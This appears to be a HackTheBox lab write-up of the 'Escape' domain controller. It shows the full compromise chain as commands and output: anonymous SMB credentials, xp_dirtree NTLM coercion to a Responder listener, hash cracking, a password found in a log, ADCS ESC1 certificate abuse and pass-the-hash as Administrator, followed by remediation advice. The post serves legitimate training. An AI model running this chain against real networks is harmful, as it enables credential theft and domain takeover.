+++
title = "Escape"
date = 2026-02-24
description = "Windows domain controller with MSSQL. A PDF on an anonymous share has SQL creds, xp_dirtree makes the SQL service account authenticate to Responder, a log backup has a user's password typed into the username field, and a certificate template with ESC1 turns that user into Administrator."
draft = false

[taxonomies]
tags = ["Active Directory", "Anonymous SMB share", "MSSQL", "NTLM coercion", "Hash cracking", "Credentials in logs", "ADCS ESC1", "Pass the hash"]

[extra]
platform = "htb"
os = "windows"
difficulty = "medium"
chain = ["Anonymous Public share", "xp_dirtree NTLM coercion", "Password in ERRORLOG.bak", "ADCS ESC1", "Pass the hash"]
+++

No creds on this one, just an IP.

## Recon

```bash
nmap -sCV -p- 10.129.6.224
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 15.00.2000.00
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows
```

A domain controller, `dc.sequel.htb`, with MSSQL and WinRM. Two things from the script output to keep for later: the SSL cert issuer is `sequel-DC-CA`, so there's a CA in the domain, and the clock is 8 hours ahead of mine.

### a PDF on the Public share

```bash
smbclient //10.129.6.224/Public -U 'anonymous'
```

```text,hl_lines=3
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022
```

Anonymous gets in, and the one file is an onboarding document for new hires. It comes with SQL Server credentials:

```text
User: PublicUser
Password: GuestUserCantWrite1
```

## Foothold: sql_svc over xp_dirtree

### nothing to do as PublicUser

```bash
impacket-mssqlclient PublicUser@10.129.6.224 -p 'GuestUserCantWrite1'
```

```text,hl_lines=10
SQL (PublicUser  guest@master)> enum_db
name     is_trustworthy_on
------   -----------------
master                   0
tempdb                   0
model                    0
msdb                     1

SQL (PublicUser  guest@master)> xp_cmdshell
ERROR: The EXECUTE permission was denied on the object 'xp_cmdshell'

SQL (PublicUser  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
```

No `xp_cmdshell`, nobody to impersonate, no linked servers worth anything. `xp_dirtree` is allowed though, and it takes a UNC path.

### making the service account call me

`xp_dirtree` lists a directory, and when the directory is on an SMB share the SQL Server service connects to it with its own account. Point it at Responder:

```bash
sudo responder -I tun0
```

```sql
xp_dirtree \\10.10.15.45\share
```

```text
sql_svc::sequel:78c5ef5996976067:7F52358E3B71CDB78CE132AB4B53EB91:0101000000000000...
```

An NTLMv2 hash for `sql_svc`.

```bash
hashcat -m 5600 sql_svc.hash rockyou.txt
```

```text
sql_svc:REGGIE1234ronnie
```

```bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

No user flag here, that one belongs to `Ryan.Cooper`.

## Lateral: sql_svc to Ryan.Cooper

There's a backup of the SQL Server error log on disk:

```powershell
type C:\SQLServer\Logs\ERRORLOG.bak
```

```text,hl_lines=3
2022-11-18 13:43:07.44 Logon  Logon failed for user 'sequel.htb\Ryan.Cooper'.
    Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon  Logon failed for user 'NuclearMosquito3'.
    Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

Two failed logins a few hundredths of a second apart, and the second "user" is a password. Ryan typed it into the wrong field.

```bash
evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

## Privesc: ESC1 on UserAuthentication

The CA from the nmap output comes back in now. Ask certipy for vulnerable templates:

```bash
certipy-ad find -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.129.6.224 -vulnerable
```

```text,hl_lines=4-5
[!] Vulnerable Certificates Templates :
    CA Name               : dc.sequel.htb\sequel-DC-CA
    Template Name         : UserAuthentication
    msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
    Enrollment Rights     : sequel\Domain Users
```

That's ESC1. The template lets whoever requests the certificate pick the subject, every domain user may enroll, and the certificate is good for client authentication. So Ryan can ask for a certificate that says Administrator:

```bash
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 \
  -ca sequel-DC-CA \
  -template UserAuthentication \
  -upn administrator@sequel.htb \
  -dc-ip 10.129.6.224
```

That writes `administrator.pfx`.

Here the 8 hours from the scan matter. Kerberos refuses a clock that far off, so sync to the DC first:

```bash
sudo timedatectl set-ntp false
sudo ntpdate 10.129.6.224
```

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.6.224
```

```text,hl_lines=3
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

The NT hash is the second half:

```bash
evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

done.

## What could Escape improve?

- no credentials in a document on a share that anonymous can read.
- the DC has no reason to open SMB connections to arbitrary hosts. Block outbound 445, and give `sql_svc` a password that isn't in rockyou.
- failed logins end up in logs with whatever was typed as the username. Keep those logs and their backups away from service accounts, and change a password once it has been typed into the wrong field.
- fix the `UserAuthentication` template: turn off `ENROLLEE_SUPPLIES_SUBJECT`, or take enrollment away from Domain Users.

## Appendix

- [Impacket](https://github.com/fortra/impacket)
- [Responder](https://github.com/lgandx/Responder)
- [hashcat](https://hashcat.net/hashcat/)
- [Certipy](https://github.com/ly4k/Certipy)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
